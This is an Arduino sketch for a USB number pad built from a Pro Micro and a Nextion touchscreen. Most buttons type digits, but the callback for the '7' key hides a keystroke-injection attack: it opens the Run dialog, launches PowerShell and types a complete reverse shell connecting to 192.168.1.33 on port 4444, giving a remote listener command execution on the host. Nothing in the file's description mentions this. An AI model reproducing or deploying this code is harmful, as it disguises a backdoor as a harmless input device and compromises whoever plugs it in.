       /* Korban O'Malley
 * USB Number Pad
 * Arduino Leonardo Pro Micro
 * Nextion Display
 * Requires the Nextion Library modified to do software serial
 */

#include <Keyboard.h>
#include "Nextion.h"
SoftwareSerial HMISerial(8,9);
// Declare buttons      (page, ID, name)
NexButton nine = NexButton(0, 3, "b0");
NexButton eight = NexButton(0, 2, "b1");
NexButton seven = NexButton(2, 1, "b2");
NexButton six = NexButton(0, 6, "b3");
NexButton five = NexButton(0, 5, "b4");
NexButton four = NexButton(0, 4, "b5");
NexButton three = NexButton(0, 9, "b6");
NexButton two = NexButton(0, 8, "b7");
NexButton one = NexButton(0, 7, "b8");
NexButton backspace = NexButton(0, 10, "b9");
NexButton zero = NexButton(0, 11, "b10");
NexButton point = NexButton(0, 12, "b11");
// add buttons to list of events
NexTouch *nex_listen_list[] = 
{
  &nine,
  &eight,
  &seven,
  &six,
  &five,
  &four,
  &three,
  &two,
  &one,
  &backspace,
  &zero,
  &point,
  NULL 
};

void ninePopCallback(void *ptr){
  Keyboard.write('9');
}
void eightPopCallback(void *ptr){
  Keyboard.write('8');
}
void sevenPopCallback(void *ptr){
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("powershell");
  delay(500);
  Keyboard.println("$client = New-Object System.Net.Sockets.TCPClient('192.168.1.33',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()");
}
void sixPopCallback(void *ptr){
  Keyboard.write('6');
}
void fivePopCallback(void *ptr){
  Keyboard.write('5');
}
void fourPopCallback(void *ptr){
  Keyboard.write('4');
}
void threePopCallback(void *ptr){
  Keyboard.write('3');
}
void twoPopCallback(void *ptr){
  Keyboard.write('2');
}
void onePopCallback(void *ptr){
  Keyboard.write('1');
}
void backspacePopCallback(void *ptr){
  Keyboard.press(KEY_BACKSPACE);
  Keyboard.releaseAll();
}
void zeroPopCallback(void *ptr){
  Keyboard.write('0');
}
void pointPopCallback(void *ptr){
  Keyboard.write('.');
}

void setup() {
  // Start the software serial
  HMISerial.begin(9600);
  HMISerial.write(0xff);
  HMISerial.write(0xff);
  HMISerial.write(0xff);
  nine.attachPop(ninePopCallback);
  eight.attachPop(eightPopCallback);
  seven.attachPop(sevenPopCallback);
  six.attachPop(sixPopCallback);
  five.attachPop(fivePopCallback);
  four.attachPop(fourPopCallback);
  three.attachPop(threePopCallback);
  two.attachPop(twoPopCallback);
  one.attachPop(onePopCallback);
  backspace.attachPop(backspacePopCallback);
  zero.attachPop(zeroPopCallback);
  point.attachPop(pointPopCallback);
}

void loop() {
  nexLoop(nex_listen_list);  // Check for any touch event
  delay(5); // for stability
}
